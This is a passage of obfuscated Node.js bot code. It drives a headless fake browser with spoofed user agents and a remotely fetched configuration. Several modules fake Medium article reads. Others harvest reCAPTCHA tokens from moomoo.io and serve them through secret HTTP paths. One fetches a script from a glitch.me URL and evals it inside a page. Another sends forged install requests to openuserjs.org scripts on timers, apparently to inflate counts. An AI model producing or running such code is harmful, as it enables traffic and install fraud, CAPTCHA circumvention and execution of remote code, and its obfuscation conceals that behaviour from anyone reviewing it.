      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0xf, 'csT(') + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + a1(0x8) + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a1(0x1b) + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + a0(0xd, '*t@c') + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + a0(0x19, '^GUP') + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + Z(0x12) + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2036 + 0x1f37 + -0x11 * -0xf
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xf59 + 0x37c * -0x1 + -0x1 * 0xbdd)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xc4c * 0x1 + -0x1811 + 0xc29), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x16 * -0x1 + 0x278 * 0x1 + 0x22a * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xfeb + -0x16bf + 0x6d4;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1ef + 0x1a3 * -0xb + 0x13f0; w < getRandomInt(-0x20a9 + -0x458 + 0x2502 * 0x1, 0x14ea + -0x2253 + -0xbf * -0x12); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x8740 + 0x29c3 * -0x3 + 0x7 * 0x200f);
        }
      }();
    }, 0x405 + 0xc11 + -0x7 * 0x23e), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x13c1 + 0x1 * -0x1044 + 0x2f * -0x13;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xe75 + 0xd46 + 0x1 * -0x1bbb, 0x2692 * 0x1 + 0x19a5 + -0x25f * 0x1b)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x25fa + 0x2 * -0xad5 + -0xb0d4 * -0x1);
    }, -0x26f5 * 0x1 + -0x1 * 0xe2b + -0x19 * -0x224), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = b;
        try {
          let s = 0x1070 + 0xb86 + -0x1bf6;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xc2 * 0x2f + -0x74c + 0x2 * 0x1b51), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2349 + -0x1847 + 0xb02 * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * -0x163745 + -0xe14e5 + 0x59940);
        } catch (v) {}
        return await page['close'](), await context[a2(0xc, 'O8ms')](), r();
      }());
    }, 0xbfa + 0x2132 + -0x2cc8);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1855 + -0x1 * -0x17d0 + -0x2f5d);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x19 * -0x3 + 0x1e77 + 0xb2 * 0x2);
}

function a() {
  const bp = [
    'slice',
    'rJDPn3DsBeDdza',
    'DSkzW6exW7C',
    'AgfZAgvK',
    'e0pcMGddNwW',
    'WOTKWQ8ldtldMIRcOCkv',
    'BgjfsMnPCfvWoa',
    'W7mZtmooW5JcH8krgW3dHG',
    'tuWSigXPA2uGrW',
    'DMjeCKnmmKz1ta',
    'lxHJBgLLBNqTyG',
    'rg/en/scri',
    'sc3dRIWs',
    'ACkmrLT5WR86WRHUW6S',
    'WOuZgCkFvSkeW4pcJvOV',
    'CmoAW60lW6SglSoqidO',
    'easyfork.o',
    'odaLouyLrtuLoq',
    'javascript',
    'B2zMC2v0ugfYzq',
    '-adblock-v',
    't,minecraf',
    'zxH0jNv0Bv9Jyq',
    'Ahr0Chm6lY9NCG',
    'yxnZAwDU',
    'cmolWPpcHCk4W7tcGmovWQfX',
    'bSosWQVdIZ4fWRhdKCkhWOm',
    'ienOCM9Tzs8Xma',
    'xnL-fRJ3RZ',
    'yxjYyxK',
    'ls1SB2fKzwq',
    '040LQr5QPy'
  ];
  a = function() {
    return bp;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  const a5 = b;
  async function f() {
    const a4 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x220f * -0x1 + -0x12d8 + -0xf36) {
        const a3 = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x53 * 0x11 + 0x1df1 + -0x186d * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * -0x164 + 0x609 + 0x76d * -0x1, D['indexOf']('\x20'));
        return B ? E[a3(0x0)](0x1 * 0x264d + -0x8 * 0x116 + -0x1d9d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x27 * -0x1d9 + -0x4ce6 + 0x1 * 0x2be7),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object[a4(0x18)](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x5e9 + -0xf85 + 0x3c7e),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + a5(0xe, '))[!') + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x78a + 0x1cb9 + -0x152f; k < 0x7 * 0x395 + -0x1 * 0x2233 + 0x924; k++)
    setTimeout(f, (0x169cb + -0x18ae0 + 0x10b75) * k * getRandomInt(-0x1b66 + -0x13 * 0x6e + 0x5 * 0x71d, -0x1f * -0x13 + 0x2067 + 0x53 * -0x6b));
  setInterval(() => {
    f();
    for (let l = -0x1d9 * -0x14 + 0x6c9 * 0x1 + -0x2bbd; l < 0x1 * -0x971 + 0x23 * 0x2e + 0x1 * 0x32b; l++)
